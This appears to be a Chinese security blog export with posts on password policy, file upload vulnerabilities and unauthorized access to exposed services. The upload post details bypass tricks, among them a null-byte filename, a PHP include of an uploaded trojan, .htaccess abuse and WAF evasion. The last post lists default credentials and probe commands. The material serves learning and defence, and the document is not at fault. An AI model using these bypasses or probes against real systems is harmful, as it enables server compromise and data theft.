<h3 id="2-口令设置"><a href="#2-口令设置" class="headerlink" title="2. 口令设置"></a>2. 口令设置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令</span><br><span class="line"></span><br><span class="line">（2）口令长度不小于8 个字符</span><br><span class="line"></span><br><span class="line">（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）</span><br><span class="line"></span><br><span class="line">（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符</span><br><span class="line"></span><br><span class="line">（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail 地址等等与本人有关的信息，以及字典中的单词</span><br><span class="line"></span><br><span class="line">（6）口令不应该为用数字或符号代替某些字母的单词</span><br><span class="line"></span><br><span class="line">（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入</span><br><span class="line"></span><br><span class="line">（8）至少90 天内更换一次口令，防止未被发现的入侵者继续使用该口令\</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-防御策略"><a href="#3-防御策略" class="headerlink" title="3. 防御策略"></a>3. 防御策略</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 少用滚键盘类的密码，尽量使用难以猜解的密码</span><br><span class="line"></span><br><span class="line">(2) 防止信息泄漏导致密码泄漏或者可能易于被猜测: 登录名和用户名应进行区分；实行有效的密码策略，杜绝密码中包含用户名；不要使用易于从企业名称或者域名中得到密码信息的口令；防止GitHub信息泄漏</span><br><span class="line"></span><br><span class="line">(3) 禁止大量系统使用同一密码</span><br><span class="line"></span><br><span class="line">(4) 不要使用默认密码，密码默认即为密码公开</span><br><span class="line"></span><br><span class="line">(5) 撞库问题防范: 应定期修改密码，不同的网站或账户不应该使用相同的密码; 对登录进行有效验证限制、各个功能接口做检验</span><br></pre></td></tr></table></figure>

<h2 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h2><ul>
<li><p><a href="https://hashcat.net/wiki/">https://hashcat.net/wiki/</a></p>
</li>
<li><p><a href="https://nmap.org/ncrack/man.html">https://nmap.org/ncrack/man.html</a></p>
</li>
<li><p><a href="https://www.openwall.com/john/doc/">https://www.openwall.com/john/doc/</a></p>
</li>
<li><p><a href="https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/">https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/</a></p>
</li>
<li><p><a href="https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/">https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/</a></p>
</li>
<li><p><a href="https://www.hackingarticles.in/comprehensive-guide-on-medusa-a-brute-forcing-tool/">https://www.hackingarticles.in/comprehensive-guide-on-medusa-a-brute-forcing-tool/</a></p>
</li>
<li><p><a href="https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/">https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/</a></p>
</li>
</ul>
<hr>
<center>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途...
</center>]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>Vulner</tag>
        <tag>Brute-force</tag>
        <tag>Init Access</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞详解</title>
    <url>/posts/50059/</url>
    <content><![CDATA[<center>本文记录文件上传漏洞原理、产生原因、绕过姿势及防御方法</center>

<span id="more"></span>
<hr>
<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><pre><code>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力，代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验

这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等，这种攻击方式是最为直接和有效的，是getshell最快最直接的方法之一
</code></pre>
<h2 id="0x02-威胁场景"><a href="#0x02-威胁场景" class="headerlink" title="0x02 威胁场景"></a>0x02 威胁场景</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 上传文件是Web脚本语言，Web服务器解释并执行了用户上传的脚本，导致代码执行</span><br><span class="line"></span><br><span class="line">(2) 上传文件是病毒或者木马时，可用于诱骗用户或者管理员下载执行或者直接自动运行</span><br><span class="line"></span><br><span class="line">(3) 上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为</span><br><span class="line"></span><br><span class="line">(4) 上传文件是钓鱼图片或包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈</span><br><span class="line"></span><br><span class="line">(5) 上传一个合法的文本文件，其内容包含了PHP脚本，再通过&quot;本地文件包含漏洞(Local  File  Include)&quot;执行此脚本</span><br></pre></td></tr></table></figure>

<h2 id="0x03-触发条件"><a href="#0x03-触发条件" class="headerlink" title="0x03 触发条件"></a>0x03 触发条件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 上传的文件能够被Web容器解释执行，文件上传后所在的目录需是Web容器所覆盖到的路径</span><br><span class="line"></span><br><span class="line">(2) 上传的文件能够从Web上访问</span><br><span class="line"></span><br><span class="line">(3) 上传的文件未被安全检查、格式化、图片压缩等功能改变内容</span><br></pre></td></tr></table></figure>

<h2 id="0x04-漏洞成因"><a href="#0x04-漏洞成因" class="headerlink" title="0x04 漏洞成因"></a>0x04 漏洞成因</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.服务器配置不当</span><br><span class="line"></span><br><span class="line">2.开源编辑器上传漏洞</span><br><span class="line"></span><br><span class="line">3.本地文件上传限制被绕过</span><br><span class="line"></span><br><span class="line">4.过滤不严或被绕过</span><br><span class="line"></span><br><span class="line">5.文件解析漏洞导致文件执行</span><br><span class="line"></span><br><span class="line">6.文件路径截断</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x05-漏洞原理"><a href="#0x05-漏洞原理" class="headerlink" title="0x05 漏洞原理"></a>0x05 漏洞原理</h2><pre><code>大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本

当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，用于getshell。根据具体漏洞的差异，上传的脚本可以是正常后缀的PHP，ASP以及JSP脚本，也可以是篡改后缀后的这几类脚本
</code></pre>
<h2 id="0x06-检测防御"><a href="#0x06-检测防御" class="headerlink" title="0x06 检测防御"></a>0x06 检测防御</h2><p>当一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据，针对文件上传过程检测校验措施如下</p>
<h3 id="1-客户端校验"><a href="#1-客户端校验" class="headerlink" title="1. 客户端校验"></a>1. 客户端校验</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过javascript来校验上传文件的后缀是否合法，可以采用白名单/黑名单的方式；在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包</span><br></pre></td></tr></table></figure>

<h3 id="2-服务端校验"><a href="#2-服务端校验" class="headerlink" title="2. 服务端校验"></a>2. 服务端校验</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 文件头content-type字段校验（image/gif）</span><br><span class="line"></span><br><span class="line">2) 文件内容头校验，通过正则匹配来判断文件幻数(文件头)内容是否符合要求，常见的文件头（文件头标志位）如下:</span><br><span class="line"></span><br><span class="line">  a) .JPEG;.JPE;.JPG，”JPGGraphicFile”（FFD8FFFE00）</span><br><span class="line"></span><br><span class="line">  b）.gif，”GIF89A”（474946383961）</span><br><span class="line"></span><br><span class="line">  c）.zip，”ZipCompressed”（504B0304）</span><br><span class="line"></span><br><span class="line">  d）.doc;.xls;.xlt;.ppt;.apr，”MSCompoundDocumentv1orLotusApproachAPRfile”（D0CF11E0A1B11AE1</span><br><span class="line"></span><br><span class="line">3）目录路经检测（检测跟Path参数相关的内容）</span><br><span class="line"></span><br><span class="line">4）文件扩展名检测(检测跟文件extension 相关的内容)</span><br><span class="line"></span><br><span class="line">5）后缀名黑名单校验</span><br><span class="line"></span><br><span class="line">6）后缀名白名单校验</span><br><span class="line"></span><br><span class="line">7）自定义正则校验</span><br></pre></td></tr></table></figure>

<h3 id="3-WAF校验"><a href="#3-WAF校验" class="headerlink" title="3. WAF校验"></a>3. WAF校验</h3><p>使用不同的WAF产品来进行过滤，通常是独立于服务程序的一段中间程序或者硬件</p>
<h2 id="0x07-绕过姿势"><a href="#0x07-绕过姿势" class="headerlink" title="0x07 绕过姿势"></a>0x07 绕过姿势</h2><h3 id="1-客户端绕过"><a href="#1-客户端绕过" class="headerlink" title="1. 客户端绕过"></a>1. 客户端绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 通过火狐插件NOscript插件或者禁用IE中JS脚本</span><br><span class="line"></span><br><span class="line">2. 通过firbug插件元素审核修改代码（如删除onsubm:t=”return checkFile()”事件）</span><br><span class="line"></span><br><span class="line">3. 通过firbug元素审核javascirpt脚本中添加上传文件类型</span><br><span class="line"></span><br><span class="line">4. 通过利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名，请求头中的Content-Length的值也要修改</span><br></pre></td></tr></table></figure>

<h3 id="2-服务端绕过"><a href="#2-服务端绕过" class="headerlink" title="2. 服务端绕过"></a>2. 服务端绕过</h3><p>(1) 黑名单扩展名绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 利用黑名单未包含的扩展名进行绕过：如iis6.0中的asa 和cer，</span><br><span class="line"></span><br><span class="line">2) 黑名单特殊后缀名绕过：pht, phpt, phtml, php3,php4,php5,php6，需满足http.conf中设置AddTypeapplication/x-httpd-php .php1(php的版本小于等于5.3.29以下)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2）利用可能存在大小写绕过漏洞：如aSp(iis6.0中）和pHp（能在小于php5.3.39中的linux中）</span><br><span class="line"></span><br><span class="line">3）利用能被WEB容器解析的文件其他扩展名列表绕过</span><br><span class="line"></span><br><span class="line">  jsp,jspx ,jspfasp </span><br><span class="line"></span><br><span class="line">  asa cer cdx,htr,xml,html</span><br><span class="line"></span><br><span class="line">  aspx,ashx,asmx,asax,ascx</span><br></pre></td></tr></table></figure>

<p>(2) 利用系统文件命名规则绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) windows系统下，如果文件名以“.”或者空格作为结尾，系统会自动删除“.”不空格，利用此特性也可以绕过黑名单验证；apache中可以利用点结尾和空格绕过，asp和aspx中可以用空格绕过</span><br><span class="line"></span><br><span class="line">2）linux中当php版本小于php5.3.39，可用pHp大小写绕过</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>(3) 服务端MIME文件类型(Content-Type)绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）MIME作用</span><br><span class="line"></span><br><span class="line">使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类，web客户端使用MIME来说明希望接收到的数据种类，它是服务器用来判断浏览器传递文件格式癿重要标记项</span><br><span class="line"></span><br><span class="line">2）常用文件上传类型的MIME表:</span><br><span class="line"></span><br><span class="line">  text/plain（纯文本）</span><br><span class="line">  text/html（HTML文档）</span><br><span class="line">  text/javascript（js代码）</span><br><span class="line">  application/xhtml+xml（XHTML文档）</span><br><span class="line">  image/gif（GIF图像）</span><br><span class="line">  image/jpeg（JPEG图像）</span><br><span class="line">  image/png（PNG图像）</span><br><span class="line">  video/mpeg（MPEG动画）</span><br><span class="line">  application/octet-stream（二进制数据）</span><br><span class="line">  application/pdf（PDF文档）</span><br><span class="line">  application/(编程语言) 该种语言的代码</span><br><span class="line">  application/msword（Microsoft Word文件）</span><br><span class="line">  message/rfc822（RFC 822形式）</span><br><span class="line">  multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）</span><br><span class="line">  application/x-www-form-urlencoded（POST方法提交癿表单）multipart/form-data（POST提交时伴随文件上传的表单）</span><br><span class="line"></span><br><span class="line">3）绕过方法</span><br><span class="line"></span><br><span class="line">上传对文件类型做了限制，可通过burpsuit将其他类文件类型修改为如：Content-Type：image/gif和image/jpeg等运行的文件类型</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>(4) 利用文件包含漏洞绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 运行上传文件包含脚本木马和一句话木马</span><br><span class="line"></span><br><span class="line">  前提：校验规则只校验当文件后缀名为asp/php/jsp癿文件内容是否为木马</span><br><span class="line"></span><br><span class="line">  (a) 先上传一个内容为木马癿txt后缀文件，因为后缀名的关系没有检验内容；</span><br><span class="line"></span><br><span class="line">  (b) 然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt; </span><br><span class="line"></span><br><span class="line">  此时，这个php文件就会去引用txt文件的内容，从而绕过校验</span><br><span class="line"></span><br><span class="line">(2) 存在本地文件包含漏洞，并可上传一句话内容马</span><br><span class="line"></span><br><span class="line">  上传一个符合条件格式的文档，文档内容为一句话木马，利用文件包含漏洞包含上传癿木马文件</span><br></pre></td></tr></table></figure>

<h3 id="3-白名单绕过"><a href="#3-白名单绕过" class="headerlink" title="3. 白名单绕过"></a>3. 白名单绕过</h3><p>(1) 利用web服务器解析漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) nginx空字节漏洞</span><br><span class="line"></span><br><span class="line">xxx.jpg%00.php 这样的文件名会被解析为php代码运行</span><br><span class="line"></span><br><span class="line">2）apache解析漏洞</span><br><span class="line"></span><br><span class="line">上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别癿，因此就会直接将类型识别为php，从而达到注入php代码的目的</span><br></pre></td></tr></table></figure>

<p>(2) .htaccess 文件重写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录访问、禁止目录列表、配置默认文档等功能</span><br><span class="line"></span><br><span class="line">配合黑名单列表绕过，上传一个自定义的.htaccess和一句话图片木马，可绕过各种检测</span><br></pre></td></tr></table></figure>

<p>(3) 文件头检测绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件头过滤主要是通过验证图片的文件头的方式来判断是不是图片文件，针对这种情况，在要上传文件的文件头里面加上图片文件头即可绕过；如图片文件是否文件头含有gif89,可以通过一句话图片木马生成工具edjpgcom或者通过编辑器在木马内容基础上再加一些文件信息</span><br><span class="line"></span><br><span class="line">不同的图片文件都有不同文件头，如：</span><br><span class="line"></span><br><span class="line">  PNG：文件头标识(8 bytes) 89 50 4E 47 0D 0A 1A 0A</span><br><span class="line">  JPEG：文件头标识(2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)</span><br><span class="line">  GIF：文件头标识(6 bytes) 4749 46 38 39(37) 61</span><br></pre></td></tr></table></figure>

<p>(4) CMS、编辑器漏洞绕过CMS漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">针对不同CMS存在的上传漏洞进行绕过</span><br><span class="line"></span><br><span class="line">编辑器漏洞：如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过</span><br></pre></td></tr></table></figure>

<p>(5) 对渲染&#x2F;加载测试攻击内容检查绕过</p>
<pre><code>通过向图片中加入代码注入，这里一般为一句话图片木马，可能正常访问图片
</code></pre>
<h3 id="4-WAF绕过"><a href="#4-WAF绕过" class="headerlink" title="4. WAF绕过"></a>4. WAF绕过</h3><p>(1) WAF检查的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件名：解析文件名，判断是否在黑名单内</span><br><span class="line"></span><br><span class="line">文件内容：解析文件内容，判断是否为webshell</span><br><span class="line"></span><br><span class="line">文件目录权限</span><br><span class="line"></span><br><span class="line">请求的url</span><br><span class="line"></span><br><span class="line">Boundary边界</span><br><span class="line"></span><br><span class="line">MIME文件类型</span><br></pre></td></tr></table></figure>

<p>(2) 绕过WAF方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 填充垃圾数据绕过</span><br><span class="line"></span><br><span class="line">有些主机WAF软件会对校验的用户数据设置大小上限，此种情况可以构造一个大文件，在木马内容前填充垃圾内容，可以绕过WAF对文件内容的校验; 可在Content-Type类型数据后添加垃圾数据，也可以将垃圾数据放在数据包最开头、绕过对文件名的校验</span><br><span class="line"></span><br><span class="line">2) POST/GET的更改方法绕过</span><br><span class="line"></span><br><span class="line">有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。此种情况可以上传一个POST型的数据包，抓包将POST改为GET</span><br><span class="line"></span><br><span class="line">3) 删除实体里面的Conten-Type字段绕过</span><br><span class="line"></span><br><span class="line">4) 删除Content-Disposition字段里的空格绕过</span><br><span class="line"></span><br><span class="line">5) 修改Content-Disposition字段值的大小写绕过  </span><br><span class="line"></span><br><span class="line">6) 文件扩展名出回车绕过（只支持php）</span><br><span class="line"></span><br><span class="line">7) 利用NTFS ADS特性绕过</span><br><span class="line"></span><br><span class="line">ADS是NTFS磁盘格式的一个特性，用亍NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过</span><br><span class="line"></span><br><span class="line">8) 文件重命名绕过</span><br><span class="line"></span><br><span class="line">如果web程序会将filename除了扩展名的那段重命名的话，可以构造更多的点、符号等绕过</span><br><span class="line"></span><br><span class="line">9) 特殊的长文件名绕过</span><br><span class="line"></span><br><span class="line">文件名使用非字母数字，比如中文等最大程度的拉长</span><br><span class="line"></span><br><span class="line">10) 引号去掉，双引号变单引号绕过</span><br><span class="line"></span><br><span class="line">11) 删除Content-Disposition值的form-data绕过</span><br><span class="line"></span><br><span class="line">12) 多个分号绕过</span><br><span class="line"></span><br><span class="line">当WAF遇到name=&quot;myfile&quot;;;时，认为没有解析到filename。而后端容器继续解析到的文件名是bk.php，导致WAF被绕过</span><br><span class="line"></span><br><span class="line">13) name和filename添加任意字符串(长度大于等于508）</span><br><span class="line"></span><br><span class="line">14) head头的content-type：tab绕过</span><br><span class="line"></span><br><span class="line">15) head头的content-type: multipart/form-data改成大写绕过</span><br><span class="line"></span><br><span class="line">16) head头的Content-Type: multipart/form-data;\n绕过</span><br></pre></td></tr></table></figure>

<h2 id="0x08-漏洞修复"><a href="#0x08-漏洞修复" class="headerlink" title="0x08 漏洞修复"></a>0x08 漏洞修复</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 将文件上传的目录设置为不可执行：只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响</span><br><span class="line"></span><br><span class="line">(3) 文件类型检查(白名单)</span><br><span class="line"></span><br><span class="line">在判断文件类型时，可以结合使用MIME Type、后缀检查等方式，在文件类型检查中，推荐白名单方式；此外对于图片的处理可使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码</span><br><span class="line"></span><br><span class="line">(4) 改写文件名和文件路径</span><br><span class="line"></span><br><span class="line">文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本</span><br><span class="line"></span><br><span class="line">(4) 本地文件上传限制被绕过：在服务器后端对上传的文件进行过滤</span><br><span class="line"></span><br><span class="line">(5) 单独设置文件服务器的域名</span><br><span class="line"></span><br><span class="line">由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript癿XSS利用等问题将得到解决</span><br><span class="line"></span><br><span class="line">(6) 开源编辑器上传漏洞</span><br><span class="line"></span><br><span class="line">更新编辑器版本,修复已知漏洞</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>Vulner</tag>
        <tag>Execution</tag>
      </tags>
  </entry>
  <entry>
    <title>未授权漏洞总结</title>
    <url>/posts/51159/</url>
    <content><![CDATA[<center>各类未授权访问漏洞原理、利用方式总结...</center>

<span id="more"></span>
<hr>
<h3 id="0x01-未授权访问"><a href="#0x01-未授权访问" class="headerlink" title="0x01 未授权访问"></a>0x01 未授权访问</h3><h4 id="1-Active-MQ-未授权访问"><a href="#1-Active-MQ-未授权访问" class="headerlink" title="1. Active MQ 未授权访问"></a>1. Active MQ 未授权访问</h4><p>默认端口：8161<br>默认密码：admin&#x2F;admin<br>服务指纹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8161/tcp open  http    Jetty httpd 7.6.7.v20120910</span><br><span class="line">|_basic realm=ActiveMQRealm</span><br></pre></td></tr></table></figure>
<h4 id="2-Atlassian-Crowd-未授权访问"><a href="#2-Atlassian-Crowd-未授权访问" class="headerlink" title="2. Atlassian Crowd 未授权访问"></a>2. Atlassian Crowd 未授权访问</h4><p>默认端口：8095<br>漏洞路径：&#x2F;crowd&#x2F;admin&#x2F;uploadplugin.action<br><strong>poc:</strong> <a href="https://github.com/jas502n/CVE-2019-11580">https://github.com/jas502n/CVE-2019-11580</a></p>
<h4 id="3-CouchDB-未授权访问"><a href="#3-CouchDB-未授权访问" class="headerlink" title="3. CouchDB 未授权访问"></a>3. CouchDB 未授权访问</h4><p>默认端口：5984<br>测试命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl ip:5984</span><br><span class="line">curl ip:5984/_config</span><br></pre></td></tr></table></figure>
<h4 id="4-Docker-Remote-API未授权访问"><a href="#4-Docker-Remote-API未授权访问" class="headerlink" title="4. Docker Remote API未授权访问"></a>4. Docker Remote API未授权访问</h4><p>默认端口：2375<br>漏洞验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看版本：http://ip:2375/version</span><br><span class="line"></span><br><span class="line">列出容器信息：http://ip:2375/v1.23/containers/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>漏洞复现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 列出所有镜像</span><br><span class="line"></span><br><span class="line">docker  -H tcp://*.*.*.*:2375 images</span><br><span class="line"></span><br><span class="line">2）列出所有容器</span><br><span class="line"></span><br><span class="line">docker  -H tcp://*.*.*.*:2375 ps -a</span><br></pre></td></tr></table></figure>
<h4 id="5-Dubbo-未授权访问"><a href="#5-Dubbo-未授权访问" class="headerlink" title="5. Dubbo 未授权访问"></a>5. Dubbo 未授权访问</h4><p>默认端口：20880<br>漏洞验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telent IP port</span><br><span class="line">nc IP PORT</span><br></pre></td></tr></table></figure>
<h4 id="6-Druid-未授权访问"><a href="#6-Druid-未授权访问" class="headerlink" title="6. Druid 未授权访问"></a>6. Druid 未授权访问</h4><p>漏洞检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直接在网站的url中后加上以下路径，如无需登录，可登录到Druid监控界面，则漏洞存在</span><br><span class="line"></span><br><span class="line">/druid/index.html</span><br><span class="line">/druid/websession.html</span><br><span class="line">/druid/datasource.html</span><br><span class="line">/druid/sql.html</span><br><span class="line">/druid/spring.html</span><br></pre></td></tr></table></figure>
<h4 id="7-Elasticsearch-未授权访问"><a href="#7-Elasticsearch-未授权访问" class="headerlink" title="7. Elasticsearch 未授权访问"></a>7. Elasticsearch 未授权访问</h4><p>默认端口：9200&#x2F;9300<br>漏洞测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://host:9200/_cat/indices</span><br><span class="line">http://host:9200/_river/_search #查看数据库敏感信息</span><br><span class="line">http://lhost:9200/_nodes #查看节点数据</span><br></pre></td></tr></table></figure>
<h4 id="8-FTP-未授权匿名访问"><a href="#8-FTP-未授权匿名访问" class="headerlink" title="8. FTP 未授权匿名访问"></a>8. FTP 未授权匿名访问</h4><p>漏洞验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问ftp路径：ftp://ip:port/</span><br><span class="line"></span><br><span class="line">匿名登录：</span><br><span class="line">  a. ftp的密码为空</span><br><span class="line">  b. anonymous的密码为空或者guest</span><br></pre></td></tr></table></figure>
<h4 id="9-Hadoop-Yarn-REST-API未授权漏洞"><a href="#9-Hadoop-Yarn-REST-API未授权漏洞" class="headerlink" title="9. Hadoop Yarn REST API未授权漏洞"></a>9. Hadoop Yarn REST API未授权漏洞</h4><p>默认端口：8088(WebUI)、50070、50075<br>漏洞验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 未授权访问，可看到Hadoop YARN ResourceManager WebUI页面</span><br><span class="line">http://ip:8088/</span><br><span class="line">http://ip:8088/cluster</span><br><span class="line"></span><br><span class="line">2) 验证指令: 返回application-id可能存在漏洞</span><br><span class="line">curl -v -X POST &#x27;http://ip:8088/ws/v1/cluster/apps/new-application&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="10-JBoss-未授权访问"><a href="#10-JBoss-未授权访问" class="headerlink" title="10. JBoss 未授权访问"></a>10. JBoss 未授权访问</h4><p><strong>漏洞介绍</strong><br>JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问<code>http://ip:8080/jmx-console</code> 就可以浏览 Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马<br><strong>漏洞检测</strong><br>访问 <code>http://ip:port/</code> 看是否能进入 jmx-console 和 web-console 页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:8080/jmx-console/</span><br><span class="line">http://ip:8080/jbossws/</span><br></pre></td></tr></table></figure>
<h4 id="11-Jenkins-未授权访问"><a href="#11-Jenkins-未授权访问" class="headerlink" title="11. Jenkins 未授权访问"></a>11. Jenkins 未授权访问</h4><p><strong>漏洞简介</strong><br>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进行脚本执行界面从而获取服务器权限<br><strong>漏洞检测</strong><br>通过url输入以下地址，若能访问，证明存在未授权访问漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;target&gt;:8080/manage</span><br><span class="line">http://&lt;target&gt;:8080/script</span><br></pre></td></tr></table></figure>
<h4 id="12-Jupyter-Notebook-未授权访问"><a href="#12-Jupyter-Notebook-未授权访问" class="headerlink" title="12. Jupyter Notebook 未授权访问"></a>12. Jupyter Notebook 未授权访问</h4><p><strong>漏洞介绍</strong><br>当管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令<br><strong>漏洞检测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 访问http://your-ip:8888将看到Jupyter Notebook的Web管理界面，没有要求填写密码</span><br><span class="line"></span><br><span class="line">2. 选择 new -&gt; terminal 即可创建一个控制台，执行任意指令</span><br></pre></td></tr></table></figure>
<h4 id="13-Kibana-未授权访问"><a href="#13-Kibana-未授权访问" class="headerlink" title="13. Kibana 未授权访问"></a>13. Kibana 未授权访问</h4><p><strong>漏洞简介</strong><br>Kibana暴露在外网，没有做安全的登录认证，会被外部随意访问查看所有的数据，造成少数据泄露<br><strong>漏洞检测</strong><br>直接访问kibana的页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:5601/</span><br><span class="line">https://ip/app/kibana#</span><br><span class="line">http://ip:5601/app/kibana#/</span><br></pre></td></tr></table></figure>
<h4 id="14-Kubernetes-API-Server-未授权"><a href="#14-Kubernetes-API-Server-未授权" class="headerlink" title="14. Kubernetes API Server 未授权"></a>14. Kubernetes API Server 未授权</h4><p><strong>漏洞简介</strong><br>Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，8080可以直接通过 Web 访问，6443可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，攻击者就可以通过这两个接口去获取容器的权限<br><strong>漏洞检测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">端口：8080，api dashboard：http://ip:8080/ui</span><br><span class="line"></span><br><span class="line">端口：10250，kubelet API的HTTPS端口，通过路径/pods获取环境变量、运行的容器信息、命名空间等信息：https://ip:10250/ui</span><br></pre></td></tr></table></figure>
<h4 id="15-LDAP-未授权访问"><a href="#15-LDAP-未授权访问" class="headerlink" title="15. LDAP 未授权访问"></a>15. LDAP 未授权访问</h4><p>默认端口：389<br>使用nmap寻找到相关的LDAP服务器，可以使用ldapbrowser直接连接，获取目录内容</p>
